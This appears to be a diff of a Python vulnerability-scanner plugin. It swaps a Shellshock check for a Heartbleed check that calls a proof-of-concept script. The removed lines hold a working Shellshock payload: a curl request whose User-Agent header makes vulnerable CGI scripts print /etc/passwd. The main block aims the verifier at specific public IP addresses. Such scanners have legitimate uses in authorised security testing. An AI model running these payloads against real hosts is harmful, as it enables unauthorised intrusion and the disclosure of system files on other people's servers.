@@ -42,29 +42,20 @@ class P(T):
         result = {}
         result['result']=False
         r=None
-        list=['/cgi-bin/test-cgi','/cgi-bin/test.cgi','/cgi-bin/load.cgi', '/cgi-bin/gsweb.cgi', '/cgi-bin/redirector.cgi',
-         '/cgi-bin/index.cgi', '/cgi-bin/help.cgi', '/cgi-bin/about.cgi', '/cgi-bin/vidredirect.cgi',
-         '/cgi-bin/click.cgi', '/cgi-bin/details.cgi', '/cgi-bin/log.cgi', '/cgi-bin/viewcontent.cgi',
-         '/cgi-bin/content.cgi', '/cgi-bin/admin.cgi', '/cgi-bin/webmail.cgi']
 
+        usecommand='python '+os.path.split(os.path.realpath(__file__))[0]+'/script/heartbleedpoc.py '+ip+' -p '+port
         try:
-            for i in list:
-                usecommand = 'curl -A "() { ignore;};echo;/bin/cat /etc/passwd" http://' + ip + ':' + port + i
-                msgresult = command(usecommand, timeout=3)
-                print msgresult
-                if 'root' in msgresult:
-                    result['result']=True
-                    result['VerifyInfo'] = {}
-                    result['VerifyInfo']['type']='bash  vul'
-                    result['VerifyInfo']['URL'] =ip+':'+port+"/cgi-bin/test-cgi"
-                    result['VerifyInfo']['payload']=usecommand
-                    result['VerifyInfo']['result'] =msgresult
-                    break
-                else:
-                    if 'not found' in msgresult:
-                        pass
-                    else:
-                        break
+            msgresult = command(usecommand, timeout=3)
+            print msgresult
+            if 'find  vulnerability' in msgresult:
+                result['result']=True
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['type']='heartbleed  vul'
+                result['VerifyInfo']['URL'] =ip+':'+port
+                result['VerifyInfo']['payload']='heartbleedpoc'
+                result['VerifyInfo']['result'] =msgresult
+            else:
+                pass
         except Exception,e:
             print e.text
         finally:
@@ -72,5 +63,4 @@ class P(T):
                 r.close()
             return result
 if __name__ == '__main__':
-    # print P().verify(ip='61.146.115.83',port='81')
-    print P().verify(ip='58.117.96.180', port='80')
+    print P().verify(ip='58.213.14.178',port='443')
